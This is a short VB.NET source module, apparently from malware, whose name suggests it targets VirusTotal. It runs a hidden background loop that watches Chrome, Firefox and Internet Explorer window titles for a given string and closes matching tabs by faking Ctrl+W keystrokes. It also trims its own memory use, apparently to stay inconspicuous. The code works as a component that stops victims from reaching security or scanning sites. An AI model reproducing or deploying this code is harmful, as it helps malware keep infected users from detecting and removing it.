Imports System.Runtime.InteropServices
Public Module virustotal1
    <DllImport("user32.dll", CallingConvention:=CallingConvention.StdCall, CharSet:=CharSet.Unicode, EntryPoint:="keybd_event", ExactSpelling:=True, SetLastError:=True)> _
    Public Function keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Int32, ByVal dwExtraInfo As Int32) As Boolean
    End Function
    <DllImport("PSAPI")> _
    Private Function EmptyWorkingSet(ByVal hProc As IntPtr) As IntPtr
    End Function
    Sub Block(ByVal sSite As String)
        Dim i As New Threading.Thread(AddressOf TS)
        i.Start(sSite)
    End Sub
    Sub TS(ByVal str As String)
        Do
            For Each x As Process In Process.GetProcessesByName("chrome")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            For Each x As Process In Process.GetProcessesByName("firefox")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            For Each x As Process In Process.GetProcessesByName("iexplore")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            EmptyWorkingSet(-1)
            Threading.Thread.Sleep(400)
        Loop
    End Sub
End Module
